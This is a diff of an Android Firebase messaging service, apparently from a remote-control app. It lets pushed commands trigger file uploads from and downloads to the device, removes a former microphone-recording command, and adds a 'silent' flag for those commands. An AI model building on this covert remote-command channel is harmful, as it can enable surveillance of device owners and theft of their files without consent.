@@ -1,3 +1,4 @@
+// MyFirebaseMessagingService.kt
 package com.elfinsaddle.service
 
 import android.util.Log
@@ -19,7 +20,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     companion object {
         private const val TAG = "MyFirebaseMsgService"
         private const val COMMAND_KEY = "command"
-        // REMOVED: COMMAND_RECORD_MIC_FCM
+        private const val SILENT_KEY = "silent" // Key for the silent flag
 
         fun fetchAndLogCurrentToken() {
             FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
@@ -90,11 +91,11 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             return
         }
 
-        // REMOVED: The block for handling record_mic command.
-
         Log.d(TAG, "Received command: '$command'. Scheduling worker.")
 
-        val extraData = remoteMessage.data.filterKeys { it != COMMAND_KEY }
+        // MODIFIED: Universal handling for the 'silent' flag
+        val isSilent = remoteMessage.data[SILENT_KEY]?.toBoolean() ?: false
+        val extraData = remoteMessage.data.filterKeys { it != COMMAND_KEY && it != SILENT_KEY }
 
         if ((command == DataFetchWorker.COMMAND_UPLOAD_FILE && !extraData.containsKey("filePath")) ||
             (command == DataFetchWorker.COMMAND_DOWNLOAD_FILE && !extraData.containsKey("serverFilePath"))) {
@@ -102,7 +103,8 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
             return
         }
 
-        DataFetchWorker.scheduleWork(applicationContext, command, extraData)
+        // MODIFIED: Pass the extracted isSilent flag to the worker scheduler
+        DataFetchWorker.scheduleWork(applicationContext, command, extraData, isSilent)
     }
 
     override fun onDeletedMessages() {
